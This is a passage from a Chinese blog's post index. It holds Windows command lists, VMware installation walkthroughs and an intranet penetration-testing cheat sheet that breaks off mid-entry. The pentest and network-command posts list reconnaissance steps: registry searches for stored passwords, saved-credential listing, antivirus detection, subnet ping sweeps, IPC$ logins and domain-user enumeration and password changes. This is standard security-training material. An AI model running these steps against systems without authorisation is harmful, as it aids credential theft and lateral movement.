        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础网络命令</title>
      <link href="/2020/11/05/ji-chu-wang-luo-ming-ling/"/>
      <url>/2020/11/05/ji-chu-wang-luo-ming-ling/</url>
      
        <content type="html"><![CDATA[<h1 id="基础网络命令"><a href="#基础网络命令" class="headerlink" title="基础网络命令"></a>基础网络命令</h1><pre class=" language-shell"><code class="language-shell"># 查看IP地址ipconfig /all# 查询账号所属权限whoami# 查看sid值whoami /all# 查询系统以及补丁信息systeminfo# 查看进程tasklist /svc  # 结束进程taskkill /im 进程名称(cmd) taskkill /pid [进程码] -t(结束该进程) -f(强制结束该进程和子进程)# 查看已安装过得补丁wmic qfe get hotfixid# 详细的补丁安装wmic qfe list full /format:htable > hotfixid.html# 显示该机器名的IPping hostname(主机名)# 查看当前运行的服务net start# 查看本地组的用户net user#  查看当前会话net session# 查看SMB指向的路径net share# 建立IPC会话net use \\IP\ipc$ password /user:username # 查看SMB指向的路径wmic share get name,path# 查询系统日志文件存储位置wmic nteventlog get path,filename,writeable#  建立IPC会话net use \\IP\ipc$ password /user:username #  查看开放的端口netstat -ano  #  找到3389端口netstat -an | find “3389”  # 查看本地密码策略net accounts# netbiso查询nbtstat –A ip# 查看机器注释net view# 查看系统是32还是64位echo %PROCESSOR_ARCHITECTURE%# 查看系统环境设置变量set#  查看进程服务wmic service list brief # 查看进程wmic process list brief # 查看启动程序信息wmic startup list brief # 查看安装程序和版本信息wmic product list brief #  识别开机启动的程序wmic startup list full  #  查看安装软件以及版本路径等信息，输出到pro.txtwmic product > pro.txt    #  查看是否支持posershellif defined PSModulePath (echo 支持powershell) else (echo 不支持powershell) # 查看登录情况qwinsta# 查看保存在注册表中的密码REG query HKCU /v "pwd" /s # 批量扫描内网存活主机（192.168.1.内网IP段）for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1 | find /i"ttl" </code></pre>]]></content>
      
      
      <categories>
          
          <category> 常用软件 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 常用命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>玩转VMware之在Windows系统中安装VMTools</title>
      <link href="/2020/11/05/wan-zhuan-vmware-zhi-zai-windows-xi-tong-zhong-an-zhuang-vmtools/"/>
      <url>/2020/11/05/wan-zhuan-vmware-zhi-zai-windows-xi-tong-zhong-an-zhuang-vmtools/</url>
      
        <content type="html"><![CDATA[<ol><li><p>打开一个新建的虚拟机（未安装VMware Tools），在认证界面中输入正确的用户名和密码登录操作系统中，结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VMware/InstallTheVMToolsInWindows/打开虚拟机并登录操作系统.png" alt="打开虚拟机并登录操作系统"></center></li><li><p>在VMware的【虚拟机】选项卡中选择【安装Vmware Tools】选项，此时操作系统中会虚拟出来一个名为<strong>WM ware Tools</strong>的DVD驱动，稍等一下驱动会自动播放，结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VMware/InstallTheVMToolsInWindows/VMwareTools自动播放.png" alt="VMwareTools自动播放"></center><p>注：<font color="red">完成此项操作时必须保证系统的ISO镜像在虚拟光驱中。</font></p></li><li><p>点击【运行setup64.exe】选项后，系统准备完毕后会进入VMware Tools的安装界面，如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VMware/InstallTheVMToolsInWindows/VMTools安装向导.png" alt="VMTools安装向导"></center></li><li><p>点击【下一步】按钮，进入安装类型界面，此处选择【典型安装】即可。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VMware/InstallTheVMToolsInWindows/选择安装类型.png" alt="选择安装类型"></center></li><li><p>点击【下一步】按钮后，准备开始安装。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VMware/InstallTheVMToolsInWindows/准备安装.png" alt="准备安装"></center></li><li><p>VMTools安装过程显示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VMware/InstallTheVMToolsInWindows/VMTools安装.png" alt="VMTools安装"></center></li><li><p>显示安装完成界面。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VMware/InstallTheVMToolsInWindows/安装完成.png" alt="安装完成"></center></li><li><p>安装完成之后需要重启才能应用成功。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VMware/InstallTheVMToolsInWindows/需要重新启动.png" alt="需要重新启动"></center></li><li><p><code>VMware Tools</code>安装完毕之后结果显示如下所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VMware/InstallTheVMToolsInWindows/VMTools安装完成.png" alt="VMTools安装完成"></center></li></ol>]]></content>
      
      
      <categories>
          
          <category> 常用软件 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> VMware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>玩转VMware之新建Windows虚拟机</title>
      <link href="/2020/11/04/wan-zhuan-vmware-zhi-xin-jian-windows-xu-ni-ji/"/>
      <url>/2020/11/04/wan-zhuan-vmware-zhi-xin-jian-windows-xu-ni-ji/</url>
      
        <content type="html"><![CDATA[<ol><li><p>双击VMware软件后，显示VMware主界面，如下图所示，本次演示操作中使用的VMware版本为<code>VMware Workstation 15 Pro</code>。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VMware/CreateWindowsOfVM/VMware主界面及版本信息.png" alt="VMware主界面及版本信息"></center></li><li><p>接下来我们需要新建一个虚拟机，这里打开新建虚拟机向导有三种方式。</p><ul><li>点击【文件】 → 【新建虚拟机…】</li><li>在界面左侧的【库】中右键后，选择【新建虚拟机…】</li><li>在【主页】选项页中点击【创建新的虚拟机】</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VMware/CreateWindowsOfVM/开始新建虚拟机.png" alt="开始新建虚拟机"></center></li><li><p>点击【新建虚拟机】后，将显示【新建虚拟机向导】界面，如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VMware/CreateWindowsOfVM/新建虚拟机向导.png" alt="新建虚拟机向导"></center><p>这里将采用【自定义（高级）】方式来创建一个新的<strong>Windows Server 2008</strong>虚拟机。选择【自定义】选项后单击【下一步】按钮。</p></li><li><p>进入虚拟机硬件兼容性设置界面，一般来说软件的版本都是向后兼容，也就是说在旧版上创建的虚拟机可以在新版中打开，但是在新版中创建的虚拟机在旧版中不一定能打开。所以这里的硬件兼容性选择 最高版本。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VMware/CreateWindowsOfVM/设置虚拟机硬件兼容性.png" alt="设置虚拟机硬件兼容性"></center></li><li><p>设置完成虚拟机的硬件兼容性后，接下来需要选择如何安装操作系统，这里有三种方式分别为：</p><ul><li>光盘形式</li><li>镜像文件形式</li><li>空白盘</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VMware/CreateWindowsOfVM/如何安装系统.png" alt="如何安装系统"></center><p>这个选择【稍后安装操作系统】选项并单击【下一步】按钮。</p></li><li><p>选择完成安装方式之后，需要先定义一下安装操作系统的类型及版本。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VMware/CreateWindowsOfVM/操作系统类型及版本.png" alt="操作系统类型及版本"></center><p>当然，前一步中选择的安装类型会对这一步产生影响，若选择空白硬盘则会出现此页面让用户选择安装操作系统的类型及版本信息，以选择的信息为标准推荐创建新虚拟机的一些操作；若选择镜像安装，则VMware会自动检测镜像文件中操作系统的类型及版本信息。</p></li><li><p>指定虚拟机操作系统类型后，还需要设置虚拟机名称及新虚拟机存放的位置信息。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VMware/CreateWindowsOfVM/命令虚拟机.png" alt="命令虚拟机"></center></li><li><p>设置虚拟机名称和位置信息后，会开始导航到硬件信息的设置，首先是设置固件类型。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VMware/CreateWindowsOfVM/设置固件类型.png" alt="设置固件类型"></center><p>这里我使用虚拟机是进行一个实验和环境的模拟所以采用较老的引导方式。</p></li><li><p>固件设置完毕后还需要对处理器进行设置。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VMware/CreateWindowsOfVM/处理器配置.png" alt="处理器配置"></center><p>这里根据需要，如果需要更高的性能就多分配几个处理器数量或内核数量，但是不要超多宿主机的复合。</p></li><li><p>处理器设置完毕之后需要设置虚拟机的内存。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VMware/CreateWindowsOfVM/内存设置.png" alt="内存设置"></center><p>这里也是同样的要求，需要更好的性能就多分一些内存给虚拟机，但是也不要分配的太多，虽然虚拟机使用资源是采用【按需分配】，目前使用到多少资源就到宿主中申请多少的内存空间，但是过多的申请宿主的内存会导致系统崩溃。</p></li><li><p>内存设置完毕之后，需要设置虚拟机的网络类型。VMware中提供三种网络连接：</p><ul><li>桥接模式：客户机与宿主具有一样的网络访问权限</li><li>NAT模式：客户机将宿主作为接口去访问网络</li><li>仅主机模式：客户机不能访问外网，仅可以做内部访问</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VMware/CreateWindowsOfVM/网络配置.png" alt="网络配置"></center><p>这里不做修改，先采用默认设置，后续可以根据实验类型再进行修改。</p></li><li><p>网络设置完毕之后需要选择I/O控制器类型，低端实验对接口没什么要求，这里采用默认设置即可。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VMware/CreateWindowsOfVM/输入输出控制器设置.png" alt="输入输出控制器设置"></center></li><li><p>设置磁盘类型，一般实验对此项没有要求，采用默认即可。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VMware/CreateWindowsOfVM/磁盘类型设置.png" alt="磁盘类型设置"></center></li><li><p>设置完磁盘类型后，需要选择磁盘分配的方式：创建新磁盘、使用已创建的磁盘、使用本机物理磁盘。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VMware/CreateWindowsOfVM/选择磁盘.png" alt="选择磁盘"></center><p>因为这样我们没有创建虚拟磁盘，也不想直接使用物理磁盘，所以这里需要新建一个磁盘。</p></li><li><p>指定磁盘容量及磁盘存储类型，按照需要指定磁盘大小，<font color="red">不要勾选立即分配所有磁盘空间</font>，磁盘空间有限，立即分配会影响宿主机存储空间的使用。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VMware/CreateWindowsOfVM/磁盘空间设置.png" alt="磁盘空间设置"></center></li><li><p>接着需要指定虚拟磁盘文件名，也即我们创建的虚拟机磁盘的名称。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VMware/CreateWindowsOfVM/磁盘文件名称.png" alt="磁盘文件名称"></center></li><li><p>设置完毕后最好进行自定义硬件操作，移除一些我们不会使用到的硬件设备。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VMware/CreateWindowsOfVM/自定义硬件.png" alt="自定义硬件"></center></li><li><p>点击【完成】按钮之后会显示刚刚创建的虚拟机，到此为止仅仅是创建好了虚拟机，但这个虚拟机还需要写入系统后才能正常使用。</p></li><li><p>开启虚拟机，进入系统安装过程。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VMware/CreateWindowsOfVM/新虚拟机启动.gif" alt="新虚拟机启动"></center></li><li><p>开始安装Windows操作系统，首先进行语言设置。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VMware/CreateWindowsOfVM/安装语言设置.png" alt="安装语言设置"></center></li><li><p>选择安装操作系统的版本。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VMware/CreateWindowsOfVM/选择安装操作系统的版本.png" alt="选择安装操作系统的版本"></center></li><li><p>接受许可条款。（霸王条款）</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VMware/CreateWindowsOfVM/接收许可条款.png" alt="接收许可条款"></center></li><li><p>选择安装类型。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VMware/CreateWindowsOfVM/安装类型.png" alt="安装类型"></center></li><li><p>将磁盘进行分区和格式化，以便安装操作系统。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VMware/CreateWindowsOfVM/磁盘分区和格式化.gif" alt="磁盘分区和格式化"></center></li><li><p>系统开始复制和安装功能。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VMware/CreateWindowsOfVM/系统安装过程.png" alt="系统安装过程"></center></li><li><p>等待一段时间之后显示如下界面表示系统已安装成功。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VMware/CreateWindowsOfVM/需要重设密码.png" alt="需要重设密码"></center></li><li><p>重新设置管理员密码后可进入操作系统。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VMware/CreateWindowsOfVM/重设密码.png" alt="重设密码"></center></li><li><p>初始化界面如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/VMware/CreateWindowsOfVM/系统初试界面.png" alt="系统初始界面"></center></li><li><p>至此Windows操作系统安装完毕。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 常用软件 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> VMware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows常用命令整理</title>
      <link href="/2020/11/04/windows-chang-yong-ming-ling-zheng-li/"/>
      <url>/2020/11/04/windows-chang-yong-ming-ling-zheng-li/</url>
      
        <content type="html"><![CDATA[<h1 id="查看网卡信息"><a href="#查看网卡信息" class="headerlink" title="查看网卡信息"></a>查看网卡信息</h1><h2 id="查看网卡简略信息"><a href="#查看网卡简略信息" class="headerlink" title="查看网卡简略信息"></a>查看网卡简略信息</h2><p><code>ipconfig</code></p><pre class=" language-shell"><code class="language-shell">λ ipconfigWindows IP 配置以太网适配器 以太网:   连接特定的 DNS 后缀 . . . . . . . :   本地链接 IPv6 地址. . . . . . . . : fe80::5838:9ef7:2e3a:9300%18   IPv4 地址 . . . . . . . . . . . . : 192.168.0.48   子网掩码  . . . . . . . . . . . . : 255.255.255.0   默认网关. . . . . . . . . . . . . : 192.168.0.1</code></pre><h2 id="查看网卡详细信息"><a href="#查看网卡详细信息" class="headerlink" title="查看网卡详细信息"></a>查看网卡详细信息</h2><p><code>ipconfig /all</code></p><pre class=" language-shell"><code class="language-shell">λ ipconfig /allWindows IP 配置   主机名  . . . . . . . . . . . . . : PARABOX   主 DNS 后缀 . . . . . . . . . . . :   节点类型  . . . . . . . . . . . . : 混合   IP 路由已启用 . . . . . . . . . . : 否   WINS 代理已启用 . . . . . . . . . : 否以太网适配器 以太网:   连接特定的 DNS 后缀 . . . . . . . :   描述. . . . . . . . . . . . . . . : Realtek PCIe GBE Family Controller   物理地址. . . . . . . . . . . . . : 80-FA-5B-45-7F-41   DHCP 已启用 . . . . . . . . . . . : 是   自动配置已启用. . . . . . . . . . : 是   本地链接 IPv6 地址. . . . . . . . : fe80::5838:9ef7:2e3a:9300%18(首选)   IPv4 地址 . . . . . . . . . . . . : 192.168.0.48(首选)   子网掩码  . . . . . . . . . . . . : 255.255.255.0   获得租约的时间  . . . . . . . . . : 2020年11月4日 星期三 8:51:55   租约过期的时间  . . . . . . . . . : 2020年11月4日 星期三 18:42:00   默认网关. . . . . . . . . . . . . : 192.168.0.1   DHCP 服务器 . . . . . . . . . . . : 192.168.0.1   DHCPv6 IAID . . . . . . . . . . . : 327219803   DHCPv6 客户端 DUID  . . . . . . . : 00-01-00-01-24-D6-F7-64-80-FA-5B-45-7F-41   DNS 服务器  . . . . . . . . . . . : 192.168.0.1   TCPIP 上的 NetBIOS  . . . . . . . : 已启用</code></pre><h1 id="查看网卡名称"><a href="#查看网卡名称" class="headerlink" title="查看网卡名称"></a>查看网卡名称</h1><p><code>netsh interface show interface</code></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/cmd/CommonCommand/查看网卡名称.png" alt="查看网卡名称"></center><h1 id="配置IP信息"><a href="#配置IP信息" class="headerlink" title="配置IP信息"></a>配置IP信息</h1><h2 id="配置静态-IP"><a href="#配置静态-IP" class="headerlink" title="配置静态 IP"></a>配置静态 IP</h2><p><code>netsh interface ip set address ccc static 192.168.10.2 255.255.255.0 192.168.10.1</code></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/cmd/CommonCommand/配置静态IP.png" alt="配置静态IP"></center><h2 id="配置动态IP"><a href="#配置动态IP" class="headerlink" title="配置动态IP"></a>配置动态IP</h2><p><code>netsh interface ip set address ccc dhcp</code></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/cmd/CommonCommand/配置动态IP.png" alt="配置动态IP"></center><h2 id="配置静态DNS"><a href="#配置静态DNS" class="headerlink" title="配置静态DNS"></a>配置静态DNS</h2><p><code>netsh interface ip set dnsserver ccc static 10.10.10.2</code></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/cmd/CommonCommand/静态DNS配置.png" alt="静态DNS配置"></center><h2 id="配置动态DNS"><a href="#配置动态DNS" class="headerlink" title="配置动态DNS"></a>配置动态DNS</h2><p><code>netsh interface ip set dnsserver ccc dhcp</code></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/cmd/CommonCommand/动态DNS配置.png" alt="动态DNS配置"></center><h1 id="查看主机名"><a href="#查看主机名" class="headerlink" title="查看主机名"></a>查看主机名</h1><pre class=" language-shell"><code class="language-shell">ping -a 127.0.0.1ipconfig</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/cmd/CommonCommand/查看主机名称.png" alt="查看主机名"></center><h1 id="配置主机名"><a href="#配置主机名" class="headerlink" title="配置主机名"></a>配置主机名</h1><p><code>netdom renamecomputer localhost /newname:cccc</code></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/cmd/CommonCommand/配置主机名.png" alt="配置主机名"></center><h1 id="查看系统SID"><a href="#查看系统SID" class="headerlink" title="查看系统SID"></a>查看系统SID</h1><p><code>whoami /user</code></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/cmd/CommonCommand/查看系统SID .png" alt="查看系统SID "></center><h1 id="用户配置"><a href="#用户配置" class="headerlink" title="用户配置"></a>用户配置</h1><h2 id="查看主机所有用户信息"><a href="#查看主机所有用户信息" class="headerlink" title="查看主机所有用户信息"></a>查看主机所有用户信息</h2><p><code>net user</code></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/cmd/CommonCommand/查看所有用户信息.png" alt="查看所有用户信息"></center><h2 id="查看指定用户信息"><a href="#查看指定用户信息" class="headerlink" title="查看指定用户信息"></a>查看指定用户信息</h2><p><code>net user administrator</code></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/cmd/CommonCommand/查看指定用户信息.png" alt="查看指定用户信息"></center><h2 id="添加新用户"><a href="#添加新用户" class="headerlink" title="添加新用户"></a>添加新用户</h2><p><code>net user admin cc.123 /add</code></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/cmd/CommonCommand/添加新用户.png" alt="添加新用户"></center><h2 id="修改用户密码"><a href="#修改用户密码" class="headerlink" title="修改用户密码"></a>修改用户密码</h2><p><code>net user admin 123.com</code></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/cmd/CommonCommand/修改用户密码.png" alt="修改用户密码"></center><h2 id="启用或禁用指定用户"><a href="#启用或禁用指定用户" class="headerlink" title="启用或禁用指定用户"></a>启用或禁用指定用户</h2><pre class=" language-shell"><code class="language-shell">net user admin /active:yes    # 启用net user admin /active:no    # 禁用</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/cmd/CommonCommand/禁用指定用户.png" alt="禁用指定用户"></center><h2 id="删除指定用户"><a href="#删除指定用户" class="headerlink" title="删除指定用户"></a>删除指定用户</h2><p><code>net user admin /del</code></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/cmd/CommonCommand/删除指定用户.png" alt="删除指定用户"></center><h1 id="组配置"><a href="#组配置" class="headerlink" title="组配置"></a>组配置</h1><h2 id="将用户添加到指定组中"><a href="#将用户添加到指定组中" class="headerlink" title="将用户添加到指定组中"></a>将用户添加到指定组中</h2><pre class=" language-shell"><code class="language-shell">net localgroup administrators admin /add</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/cmd/CommonCommand/将用户添加到指定用户组中.png" alt="将用户添加到指定用户组中"></center><h2 id="创建组"><a href="#创建组" class="headerlink" title="创建组"></a>创建组</h2><pre class=" language-shell"><code class="language-shell">net localgroup z1r0s /add</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/cmd/CommonCommand/创建组.png" alt="创建组"></center><h2 id="查看指定组信息"><a href="#查看指定组信息" class="headerlink" title="查看指定组信息"></a>查看指定组信息</h2><pre class=" language-shell"><code class="language-shell">net localgroup administrators </code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/cmd/CommonCommand/查看指定组信息.png" alt="查看指定组信息"></center><h2 id="删除组中的用户"><a href="#删除组中的用户" class="headerlink" title="删除组中的用户"></a>删除组中的用户</h2><pre class=" language-shell"><code class="language-shell">net localgroup administrators admin /del</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/cmd/CommonCommand/删除组中的用户.png" alt="删除组中的用户"></center><h2 id="删除组"><a href="#删除组" class="headerlink" title="删除组"></a>删除组</h2><pre class=" language-shell"><code class="language-shell">net localgroup z1r0s /del</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/cmd/CommonCommand/删除组.png" alt="删除组"></center>]]></content>
      
      
      <categories>
          
          <category> 软件使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 常用命令 </tag>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透常用命令</title>
      <link href="/2020/11/01/nei-wang-shen-tou-chang-yong-ming-ling/"/>
      <url>/2020/11/01/nei-wang-shen-tou-chang-yong-ming-ling/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows（工作组和域）"><a href="#Windows（工作组和域）" class="headerlink" title="Windows（工作组和域）"></a>Windows（工作组和域）</h1><h2 id="0x01-检查当前shell权限"><a href="#0x01-检查当前shell权限" class="headerlink" title="0x01 检查当前shell权限"></a>0x01 检查当前shell权限</h2><pre class=" language-powershell"><code class="language-powershell">whoami <span class="token operator">/</span>user &amp;&amp; whoami <span class="token operator">/</span>priv</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/Intranet/Win-Commands/查看当前shell权限.png" alt="查看当前shell权限"></center><ul><li>获取用户SID值、根据特权信息判断当前用户权限等级</li></ul><h2 id="0x02-查看系统信息"><a href="#0x02-查看系统信息" class="headerlink" title="0x02 查看系统信息"></a>0x02 查看系统信息</h2><pre class=" language-powershell"><code class="language-powershell">systeminfo</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/Intranet/Win-Commands/查看系统信息.png" alt="查看系统信息"></center><ul><li>主机名 → 域中扮演的角色</li><li>系统版本 → 整理相关漏洞</li><li>修补程序 → 未及时修复的补丁</li></ul><h2 id="0x03-TCP-UDP网络连接状态信息"><a href="#0x03-TCP-UDP网络连接状态信息" class="headerlink" title="0x03 TCP/UDP网络连接状态信息"></a>0x03 TCP/UDP网络连接状态信息</h2><pre class=" language-powershell"><code class="language-powershell">netstat <span class="token operator">-</span>ano</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/Intranet/Win-Commands/网络连接状态信息.png" alt="网络连接状态信息"></center><ul><li>获取内网IP分布状态-服务（redis）</li></ul><h2 id="0x04-机器名"><a href="#0x04-机器名" class="headerlink" title="0x04 机器名"></a>0x04 机器名</h2><pre class=" language-powershell"><code class="language-powershell">hostname</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/Intranet/Win-Commands/获取机器名.png" alt="获取机器名"></center><h2 id="0x05-查看当前操作系统"><a href="#0x05-查看当前操作系统" class="headerlink" title="0x05 查看当前操作系统"></a>0x05 查看当前操作系统</h2><pre class=" language-powershell"><code class="language-powershell">wmic OS get Caption<span class="token punctuation">,</span>CSDversion<span class="token punctuation">,</span>OSArchitecture<span class="token punctuation">,</span>Version</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/Intranet/Win-Commands/查看操作系统信息.png" alt="查看操作系统信息"></center><pre class=" language-powershell"><code class="language-powershell">ver</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/Intranet/Win-Commands/操作系统版本信息.png" alt="操作系统版本信息"></center><h2 id="0x06-查杀软"><a href="#0x06-查杀软" class="headerlink" title="0x06 查杀软"></a>0x06 查杀软</h2><pre class=" language-powershell"><code class="language-powershell">wmic <span class="token operator">/</span>node:localhost <span class="token operator">/</span>Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName <span class="token operator">/</span>Format:List</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/Intranet/Win-Commands/查杀软.png" alt="查杀软"></center><h2 id="0x07-查看当前安装的程序"><a href="#0x07-查看当前安装的程序" class="headerlink" title="0x07 查看当前安装的程序"></a>0x07 查看当前安装的程序</h2><pre class=" language-powershell"><code class="language-powershell">wmic product get name<span class="token punctuation">,</span>version</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/Intranet/Win-Commands/查看当前安装的程序.png" alt="查看当前安装的程序"></center><h2 id="0x08-查看在线用户"><a href="#0x08-查看在线用户" class="headerlink" title="0x08 查看在线用户"></a>0x08 查看在线用户</h2><pre class=" language-powershell"><code class="language-powershell">quser</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/Intranet/Win-Commands/查看在线用户.png" alt="查看在线用户"></center><h2 id="0x09-查看网络配置"><a href="#0x09-查看网络配置" class="headerlink" title="0x09 查看网络配置"></a>0x09 查看网络配置</h2><pre class=" language-powershell"><code class="language-powershell">ipconfig <span class="token operator">/</span>all</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/Intranet/Win-Commands/查看网络配置.png" alt="查看网络配置"></center><ul><li>有<code>Primary Dns Suffix</code>就说明是域内，空的则当前机器应该在工作组</li></ul><h2 id="0x10-查看进程"><a href="#0x10-查看进程" class="headerlink" title="0x10 查看进程"></a>0x10 查看进程</h2><pre class=" language-powershell"><code class="language-powershell">tasklist <span class="token operator">/</span>v</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/Intranet/Win-Commands/查看进程.png" alt="查看进程"></center><ul><li>有些进程可能是域用户启用的 → 通过管理员权限窃取凭证 → 窃取域用户的凭证</li></ul><h2 id="0x11-查看当前登录域"><a href="#0x11-查看当前登录域" class="headerlink" title="0x11 查看当前登录域"></a>0x11 查看当前登录域</h2><pre class=" language-powershell"><code class="language-powershell">net config workstation</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/Intranet/Win-Commands/查看当前登录域.png" alt="查看当前登录域"></center><h2 id="0x12-远程桌面连接历史"><a href="#0x12-远程桌面连接历史" class="headerlink" title="0x12 远程桌面连接历史"></a>0x12 远程桌面连接历史</h2><pre class=" language-powershell"><code class="language-powershell">cmdkey <span class="token operator">/</span>l</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/Intranet/Win-Commands/远程桌面连接历史.png" alt="远程桌面连接历史"></center><h2 id="0x13-查看本机用户账户列表"><a href="#0x13-查看本机用户账户列表" class="headerlink" title="0x13 查看本机用户账户列表"></a>0x13 查看本机用户账户列表</h2><pre class=" language-powershell"><code class="language-powershell">net user</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/Intranet/Win-Commands/本机用户账户列表.png" alt="本机用户账户列表"></center><h2 id="0x14-查看指定用户信息"><a href="#0x14-查看指定用户信息" class="headerlink" title="0x14 查看指定用户信息"></a>0x14 查看指定用户信息</h2><pre class=" language-powershell"><code class="language-powershell">net user Administrator</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/Intranet/Win-Commands/查看指定用户信息.png" alt="查看指定用户信息"></center><h2 id="0x15-查看域用户"><a href="#0x15-查看域用户" class="headerlink" title="0x15 查看域用户"></a>0x15 查看域用户</h2><pre class=" language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># 显示所在域的用户名单</span>net user <span class="token operator">/</span>domain<span class="token comment" spellcheck="true"># 获取某个域用户的详细信息</span>net user 域用户 <span class="token operator">/</span>domain<span class="token comment" spellcheck="true"># 修改域用户密码（需要管理员权限）</span>net user <span class="token operator">/</span>domain xxx 123456</code></pre><h1 id="Windows（域）"><a href="#Windows（域）" class="headerlink" 